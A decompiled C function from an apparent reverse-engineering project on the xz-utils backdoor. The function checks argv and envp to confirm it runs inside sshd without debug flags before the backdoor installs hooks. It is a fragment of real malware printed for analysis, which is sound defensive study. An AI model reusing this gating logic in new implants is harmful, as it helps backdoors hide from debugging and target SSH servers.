// /home/kali/xzre-ghidra/xzregh/103A20_process_is_sshd.c
// Function: process_is_sshd @ 0x103A20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall process_is_sshd(elf_info_t * elf, u8 * stack_end)
/*
 * AutoDoc: Walks argv and envp from the saved stack pointer to ensure the process really is sshd, no debug flags are active, and no suspicious environment settings are present. Backdoor setup treats this as a hard prerequisite before it touches ld.so or installs any hooks.
 */

#include "xzre_types.h"


BOOL process_is_sshd(elf_info_t *elf,u8 *stack_end)

{
  long lVar1;
  u8 *puVar2;
  EncodedStringId EVar3;
  char *pcVar4;
  u8 *puVar5;
  long lVar6;
  ulong *puVar7;
  bool bVar8;
  u64 local_40 [2];
  
  if (((((&stack0xfffffffffffffff8 < stack_end) &&
        ((ulong)((long)stack_end - (long)&stack0xfffffffffffffff8) < 0x2001)) &&
       (lVar1 = *(long *)stack_end, lVar1 - 1U < 0x20)) &&
      ((puVar2 = *(u8 **)(stack_end + 8), stack_end < puVar2 && (puVar2 != (u8 *)0x0)))) &&
     ((ulong)((long)puVar2 - (long)stack_end) < 0x4001)) {
    EVar3 = get_string_id((char *)puVar2,(char *)0x0);
    lVar6 = 1;
    if (EVar3 == STR_usr_sbin_sshd) {
      while (bVar8 = lVar6 != lVar1, lVar6 = lVar6 + 1, bVar8) {
        puVar2 = *(u8 **)(stack_end + lVar6 * 8);
        if (puVar2 <= stack_end) {
          return 0;
        }
        if (puVar2 == (u8 *)0x0) {
          return 0;
        }
        if (0x4000 < (ulong)((long)puVar2 - (long)stack_end)) {
          return 0;
        }
        pcVar4 = check_argument((char)*(undefined2 *)puVar2,(char *)puVar2);
        if (pcVar4 != (char *)0x0) {
          return 0;
        }
      }
      if (*(long *)(stack_end + lVar6 * 8) == 0) {
        puVar7 = (ulong *)(stack_end + lVar6 * 8 + 8);
        do {
          puVar2 = (u8 *)*puVar7;
          if (puVar2 == (u8 *)0x0) {
            return 0;
          }
          if ((puVar2 <= stack_end) || (0x4000 < (ulong)((long)puVar2 - (long)stack_end))) {
            local_40[0] = 0;
            puVar5 = (u8 *)elf_get_data_segment(elf,local_40,1);
            if (puVar5 == (u8 *)0x0) {
              return 0;
            }
            if (puVar5 + local_40[0] < puVar2 + 0x2c) {
              return 0;
            }
            if (puVar2 < puVar5) {
              return 0;
            }
          }
          EVar3 = get_string_id((char *)*puVar7,(char *)0x0);
          if (EVar3 != 0) {
            return 0;
          }
          puVar7 = puVar7 + 1;
        } while (*puVar7 != 0);
        return 1;
      }
    }
  }
  return 0;
}

